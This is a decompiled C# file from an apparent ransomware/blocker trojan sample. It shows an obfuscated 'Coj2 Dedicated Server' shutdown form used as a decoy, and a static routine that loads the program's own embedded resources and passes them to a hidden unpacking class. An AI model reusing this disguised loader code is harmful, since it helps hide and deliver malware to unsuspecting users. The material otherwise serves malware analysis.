// Decompiled with JetBrains decompiler
// Type: Pp74.m0PK
// Assembly: x7B, Version=2.6.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 72C9F8B9-C30C-42FF-A20F-D6EFD67D7612
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2418d44a37a673ad3dd3925b67abd7857ec51ac2f4874231b9e01823ff825bf6.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using y6N2;

namespace Pp74
{
  [DesignerGenerated]
  public class m0PK : Form
  {
    private IContainer components;
    private const int WM_CHAR = 258;
    private const int EM_GETLINE = 196;
    private const int EM_GETLINECOUNT = 186;
    private bool btnApagadoPulsado;
    private int countDown;
    private double SumaBarra;
    private double Rojo;
    private double Verde;
    private double SumaResta;
    private object frmConsola;
    private object FrmMain;
    private bool CerrarServidor;

    public m0PK()
    {
      this.FormClosing += new FormClosingEventHandler(this.b4EJ);
      this.Load += new EventHandler(this.Lg7n);
      this.Shown += new EventHandler(this.Wq21);
      this.btnApagadoPulsado = false;
      this.countDown = 85;
      this.SumaBarra = 0.0;
      this.Rojo = (double) byte.MaxValue;
      this.Verde = 30.0;
      this.SumaResta = (this.Rojo - this.Verde) / (double) checked (this.countDown - 30);
      this.Jn28();
    }

    [DebuggerNonUserCode]
    protected virtual void t1XL(bool c3N0)
    {
      try
      {
        if (!c3N0 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(c3N0);
      }
    }

    [DebuggerStepThrough]
    private void Jn28()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (m0PK));
      this.Label1 = new Label();
      this.btnShutdown = new Button();
      this.btnCancel = new Button();
      this.Timershutdown = new Timer(this.components);
      this.PanelProgresBar = new Panel();
      this.lblProgressBarr = new Label();
      this.PanelProgresBar.SuspendLayout();
      this.SuspendLayout();
      this.Label1.Font = new Font("Playbill", 18.15652f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = Color.FromArgb(100, 70, 30);
      this.Label1.Location = new Point(2, 28);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(454, 35);
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Coj2 Dedicated Server is running!!!";
      this.Label1.TextAlign = ContentAlignment.MiddleCenter;
      this.btnShutdown.AutoSize = true;
      this.btnShutdown.BackColor = Color.Firebrick;
      this.btnShutdown.Font = new Font("Segoe UI", 8.139131f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnShutdown.ForeColor = SystemColors.ControlLight;
      this.btnShutdown.Location = new Point(65, 132);
      this.btnShutdown.Margin = new Padding(3, 2, 3, 2);
      this.btnShutdown.Name = "btnShutdown";
      this.btnShutdown.Size = new Size(139, 35);
      this.btnShutdown.TabIndex = 29;
      this.btnShutdown.Text = "Shutdown (10s)";
      this.btnShutdown.UseVisualStyleBackColor = false;
      this.btnCancel.AutoSize = true;
      this.btnCancel.BackColor = Color.OliveDrab;
      this.btnCancel.Font = new Font("Segoe UI", 8.139131f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnCancel.ForeColor = SystemColors.ControlLight;
      this.btnCancel.Location = new Point(253, 132);
      this.btnCancel.Margin = new Padding(3, 2, 3, 2);
      this.btnCancel.Name = "btnCancel";
      this.btnCancel.Size = new Size(139, 35);
      this.btnCancel.TabIndex = 30;
      this.btnCancel.Text = "Cancel";
      this.btnCancel.UseVisualStyleBackColor = false;
      this.PanelProgresBar.BackColor = SystemColors.ControlLight;
      this.PanelProgresBar.BorderStyle = BorderStyle.FixedSingle;
      this.PanelProgresBar.Controls.Add((Control) this.lblProgressBarr);
      this.PanelProgresBar.Location = new Point(67, 88);
      this.PanelProgresBar.Name = "PanelProgresBar";
      this.PanelProgresBar.Size = new Size(324, 19);
      this.PanelProgresBar.TabIndex = 32;
      this.lblProgressBarr.BackColor = Color.FromArgb((int) byte.MaxValue, 30, 30);
      this.lblProgressBarr.Location = new Point(0, 0);
      this.lblProgressBarr.Name = "lblProgressBarr";
      this.lblProgressBarr.Size = new Size(51, 17);
      this.lblProgressBarr.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(459, 213);
      this.Controls.Add((Control) this.PanelProgresBar);
      this.Controls.Add((Control) this.btnCancel);
      this.Controls.Add((Control) this.btnShutdown);
      this.Controls.Add((Control) this.Label1);
      this.Font = new Font("Segoe UI", 8.139131f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MaximumSize = new Size(475, 252);
      this.MinimizeBox = false;
      this.MinimumSize = new Size(475, 252);
      this.Name = "frmClosingServer";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Closing Server...";
      this.PanelProgresBar.ResumeLayout(false);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button btnShutdown
    {
      get => this._btnShutdown;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.s4G3);
        Button btnShutdown1 = this._btnShutdown;
        if (btnShutdown1 != null)
          btnShutdown1.Click -= eventHandler;
        this._btnShutdown = value;
        Button btnShutdown2 = this._btnShutdown;
        if (btnShutdown2 == null)
          return;
        btnShutdown2.Click += eventHandler;
      }
    }

    internal virtual Button btnCancel
    {
      get => this._btnCancel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Ti21);
        Button btnCancel1 = this._btnCancel;
        if (btnCancel1 != null)
          btnCancel1.Click -= eventHandler;
        this._btnCancel = value;
        Button btnCancel2 = this._btnCancel;
        if (btnCancel2 == null)
          return;
        btnCancel2.Click += eventHandler;
      }
    }

    internal virtual Timer Timershutdown
    {
      get => this._Timershutdown;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.e3TL);
        Timer timershutdown1 = this._Timershutdown;
        if (timershutdown1 != null)
          timershutdown1.Tick -= eventHandler;
        this._Timershutdown = value;
        Timer timershutdown2 = this._Timershutdown;
        if (timershutdown2 == null)
          return;
        timershutdown2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PanelProgresBar")]
    internal virtual Panel PanelProgresBar { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblProgressBarr")]
    internal virtual Label lblProgressBarr { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32", EntryPoint = "PostMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int PostMessage(int hwnd, int wMsg, int wParam, int lParam);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SendMessageSTRING(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SendMessageAsLong(int hWnd, int wMsg, int wParam, int lParam);

    [DllImport("user32", EntryPoint = "FindWindowExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindowEx(
      int hWnd1,
      int hWnd2,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

    private void Ti21(object Hf8y, EventArgs g4T2)
    {
      this.CerrarServidor = false;
      this.Close();
      this.Dispose();
    }

    private void s4G3(object Zq16, EventArgs Cz42)
    {
      this.btnShutdown.Enabled = false;
      this.btnCancel.Enabled = false;
      this.SumaBarra = (double) checked (this.PanelProgresBar.Width - 2) / 80.0;
      this.btnApagadoPulsado = true;
      this.Timershutdown.Enabled = true;
      this.Label1.Text = "Coj2 Dedicated Server is shutting down";
      this.Timershutdown.Enabled = true;
      string str1 = "/servershutdown";
      string str2 = "ConsoleWindowClass";
      ref string local1 = ref str2;
      string str3 = (string) null;
      ref string local2 = ref str3;
      int window = m0PK.FindWindow(ref local1, ref local2);
      int num = Strings.Len(str1);
      int Start = 1;
      string str4;
      while (Start <= num)
      {
        int hwnd = window;
        int wParam = Strings.Asc(Strings.Mid(str1, Start, 1));
        str4 = Conversions.ToString(0L);
        ref string local3 = ref str4;
        m0PK.SendMessageSTRING(hwnd, 258, wParam, ref local3);
        checked { ++Start; }
      }
      int hwnd1 = window;
      str4 = Conversions.ToString(0L);
      ref string local4 = ref str4;
      m0PK.SendMessageSTRING(hwnd1, 258, 13, ref local4);
      int hwnd2 = window;
      str4 = Conversions.ToString(0L);
      ref string local5 = ref str4;
      m0PK.SendMessageSTRING(hwnd2, 258, 10, ref local5);
      this.CerrarServidor = true;
    }

    private void b4EJ(object t0X6, FormClosingEventArgs Lo71)
    {
      if (!this.btnApagadoPulsado)
        Lo71.Cancel = true;
      else
        this.Dispose();
    }

    private void e3TL(object Az1y, EventArgs Nz37)
    {
      if (this.countDown < 55)
      {
        this.Rojo -= this.SumaResta;
        this.Verde += this.SumaResta;
      }
      if (this.countDown == -1)
      {
        this.Timershutdown.Enabled = false;
        this.Close();
        this.Dispose();
        NewLateBinding.LateCall(this.FrmMain, (System.Type) null, "Show", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      else
      {
        NewLateBinding.LateCall(this.FrmMain, (System.Type) null, "Hide", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        if (this.Verde < 256.0)
          this.lblProgressBarr.BackColor = Color.FromArgb(checked ((int) Conversion.Int(this.Rojo)), checked ((int) Conversion.Int(this.Verde)), 30);
        this.lblProgressBarr.Width = checked ((int) Math.Round(unchecked ((double) this.lblProgressBarr.Width + Conversion.Int(this.SumaBarra))));
        if (Operators.CompareString(Strings.Mid(this.countDown.ToString().Trim(), 2, 1), "0", false) == 0)
        {
          this.Label1.Text += ".";
          this.btnShutdown.Text = "Shutdown (" + ((double) this.countDown / 10.0).ToString().Trim() + ")";
        }
        checked { --this.countDown; }
      }
    }

    private void Lg7n(object Bx26, EventArgs r8KJ) => this.lblProgressBarr.Width = 0;

    private void Wq21(object b8ZX, EventArgs Xx2t)
    {
      NewLateBinding.LateCall(this.FrmMain, (System.Type) null, "Hide", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      NewLateBinding.LateCall(this.frmConsola, (System.Type) null, "Hide", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    }

    [STAThread]
    public static void r3TG()
    {
      try
      {
        List<object> Sj80 = new List<object>();
        int count1 = Sj80.Count;
        while (count1 <= 0)
        {
          checked { ++count1; }
          Sj80.Add((object) count1);
        }
        Sj80.Add((object) Assembly.LoadFrom(Application.ExecutablePath));
        Sj80.Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Sj80[1], (System.Type) null, "GetManifestResourceNames", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
        if (Sj80[2] == null || Sj80.Count <= 2)
          return;
        Ao56.k1LA(Sj80);
        int count2 = Sj80.Count;
        if (count2 > 0)
        {
          int num = checked (count2 * 25 * 25);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    static void Xm43()
    {
      // ISSUE: unable to decompile the method.
    }

    static void s6QA()
    {
      // ISSUE: unable to decompile the method.
    }

    static void b1XH()
    {
      // ISSUE: unable to decompile the method.
    }

    static void Mt95()
    {
      // ISSUE: unable to decompile the method.
    }

    static void Mr49()
    {
      // ISSUE: unable to decompile the method.
    }

    static void q5BA()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
